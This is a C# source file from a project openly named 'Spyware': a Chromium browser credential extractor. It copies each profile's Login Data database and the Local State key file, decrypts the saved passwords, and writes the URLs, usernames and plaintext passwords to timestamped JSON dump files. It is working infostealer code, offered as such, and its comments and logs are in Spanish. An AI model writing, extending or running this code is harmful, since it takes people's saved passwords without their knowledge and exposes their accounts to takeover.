using System.Text.Json;
using Microsoft.Data.Sqlite;
using Spyware.Core.Configuration;
using Spyware.Core.Contracts;
using Spyware.Core.Logging;
using Spyware.Core.Paths;
using Spyware.Core.Security;

namespace Spyware.Collectors.Browsers;

public sealed class ChromiumCredentialExtractor
{
    private readonly BrowserDefinition _browser;
    private readonly string _userDataRoot;
    private readonly AgentPaths _paths;
    private readonly BrowserSection _config;
    private readonly ILog _log;

    public ChromiumCredentialExtractor(BrowserDefinition browser, string userDataRoot,
                                       AgentPaths paths, BrowserSection config, ILog log)
    {
        _browser = browser;
        _userDataRoot = userDataRoot;
        _paths = paths;
        _config = config;
        _log = log;
    }

    public IReadOnlyList<CredentialEvent> Collect()
    {
        var results = new List<CredentialEvent>();
        string tempDirectory = Path.Combine(_paths.TempDirectory, $"{_browser.Id}-{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempDirectory);

        try
        {
            KeyResult key = LoadKey(tempDirectory);

            foreach ((string profileName, string profileDirectory) in EnumerateProfiles())
            {
                string loginData = Path.Combine(profileDirectory, "Login Data");
                string copy = Path.Combine(tempDirectory, profileName.Replace(' ', '_') + "-Login Data");

                if (!File.Exists(loginData))
                {
                    results.Add(Row(profileName, string.Empty, string.Empty, null, CredentialStatus.NotFound, "login_data_missing"));
                    continue;
                }

                if (!FileCopier.TryCopyWithSidecars(loginData, copy, _log, out string? copyFailure))
                {
                    _log.Warn($"{_browser.DisplayName}/{profileName}: Login Data no se pudo copiar ({copyFailure}).");
                    results.Add(Row(profileName, string.Empty, string.Empty, null, MapCopyFailure(copyFailure), copyFailure));
                    continue;
                }

                IReadOnlyList<LoginRow> logins;
                try
                {
                    logins = SqliteReader.Read(copy, _config.MaxResultsPerRun, _log);
                }
                catch (SqliteException ex)
                {
                    _log.Error($"{_browser.DisplayName}/{profileName}: base de datos ilegible.", ex);
                    results.Add(Row(profileName, string.Empty, string.Empty, null, CredentialStatus.Corrupted, "sqlite_error"));
                    continue;
                }

                foreach (LoginRow login in logins)
                    results.Add(Build(profileName, login, key));

                _log.Info($"{_browser.DisplayName}/{profileName}: {logins.Count} credenciales leídas.");
            }

            if (_config.WriteDumpFile && results.Count > 0)
                WriteDump(results);

            return results;
        }
        finally
        {
            try { Directory.Delete(tempDirectory, recursive: true); }
            catch (Exception ex) { _log.Debug("Limpieza de temp: " + ex.Message); }
        }
    }

    private KeyResult LoadKey(string tempDirectory)
    {
        string localState = Path.Combine(_userDataRoot, "Local State");
        if (!File.Exists(localState))
            return new KeyResult(null, "local_state_missing");

        string copy = Path.Combine(tempDirectory, "Local State");
        if (!FileCopier.TryCopy(localState, copy, _log, out string? failure))
            return new KeyResult(null, failure);

        return ChromiumKeyProvider.TryGetKey(copy, _log);
    }

    private CredentialEvent Build(string profile, LoginRow login, KeyResult key)
    {
        CredentialOutcome outcome = ChromePasswordDecryptor.Decrypt(login.PasswordBlob, key.AesKey, _log);

        return new CredentialEvent
        {
            TimestampUtc = DateTime.UtcNow,
            Browser = _browser.Id,
            Profile = profile,
            Url = login.OriginUrl,
            Username = login.Username,
            Password = outcome.Password,
            Status = outcome.Status,
            FailureReason = outcome.FailureReason ?? key.Failure,
            EncryptedBlobBase64 = _config.KeepEncryptedBlob && login.PasswordBlob is { Length: > 0 }
                ? HashHelper.ToBase64(login.PasswordBlob)
                : null,
            CreatedAt = ChromeTime.FromMicroseconds(login.DateCreated),
            LastUsedAt = ChromeTime.FromMicroseconds(login.DateLastUsed),
            TimesUsed = login.TimesUsed
        };
    }

    private CredentialEvent Row(string profile, string url, string username, byte[]? blob, string status, string? reason) =>
        new()
        {
            TimestampUtc = DateTime.UtcNow,
            Browser = _browser.Id,
            Profile = profile,
            Url = url,
            Username = username,
            Password = null,
            Status = status,
            FailureReason = reason,
            EncryptedBlobBase64 = blob is null ? null : HashHelper.ToBase64(blob)
        };

    /// <summary>Perfiles reales: Default y "Profile N" que contengan Login Data.</summary>
    private IEnumerable<(string Name, string Directory)> EnumerateProfiles()
    {
        foreach (string directory in System.IO.Directory.EnumerateDirectories(_userDataRoot))
        {
            string name = Path.GetFileName(directory);

            if (!string.Equals(name, "Default", StringComparison.OrdinalIgnoreCase) &&
                !name.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase))
            {
                continue;
            }

            if (File.Exists(Path.Combine(directory, "Login Data")))
                yield return (name, directory);
        }
    }

    private static string MapCopyFailure(string? failure) => failure switch
    {
        "access_denied" => CredentialStatus.AccessDenied,
        "not_found" => CredentialStatus.NotFound,
        _ => CredentialStatus.Locked
    };

    private void WriteDump(IReadOnlyList<CredentialEvent> results)
    {
        try
        {
            string json = JsonSerializer.Serialize(results.Select(r => new
            {
                r.Browser,
                r.Profile,
                r.Url,
                r.Username,
                r.Password,
                r.Status,
                r.FailureReason,
                r.CreatedAt,
                r.LastUsedAt,
                r.EncryptedBlobBase64
            }), new JsonSerializerOptions { WriteIndented = true });

            string path = _paths.CredentialDirectory;
            Directory.CreateDirectory(path);

            File.WriteAllText(
                Path.Combine(path, $"creds_{_browser.Id}_{DateTime.UtcNow:yyyyMMdd'Z'HHmmss}.json"),
                json);
        }
        catch (Exception ex)
        {
            _log.Warn("Volcado de credenciales no escrito: " + ex.Message);
        }
    }
}
